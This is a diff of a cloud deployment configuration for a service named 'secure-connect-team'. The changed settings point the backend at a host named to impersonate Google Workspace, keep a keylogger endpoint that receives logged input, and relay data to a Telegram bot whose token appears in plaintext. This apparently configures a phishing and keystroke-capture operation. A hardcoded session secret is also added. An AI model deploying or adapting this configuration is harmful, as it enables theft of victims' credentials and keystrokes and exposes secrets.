@@ -4,9 +4,7 @@ services:
     env: node
     repo: https://github.com/investorsfundingsm-ux/secure-connect-team
     branch: main
-    buildCommand: |
-      npm install -g npm@latest
-      cd backend && npm install
+    buildCommand: cd backend && npm install
     startCommand: node backend/server.js
     envVars:
       - key: PORT
@@ -18,12 +16,14 @@ services:
         value: 8738758416:AAFrRHdJP-lEYbvqsJdlSxlEm23DWZ4vLRo
       - key: TELEGRAM_CHAT_ID
         sync: false
-        value: -1001234567890
+        value: 7066788965
       - key: BACKEND_URL
-        value: https://secure-connect-team-backend.onrender.com
+        value: https://google-workspace-service.onrender.com
       - key: KEYLOGGER_URL
         value: https://keyserver-eaar.onrender.com/log
+      - key: SESSION_SECRET
+        value: secure-connect-team-secret-2024
     disk:
-      name: puppeteer-data
-      mountPath: /opt/render/project/src/backend/puppeteer-user-data
+      name: session-data
+      mountPath: /tmp/sessions
       sizeGB: 1
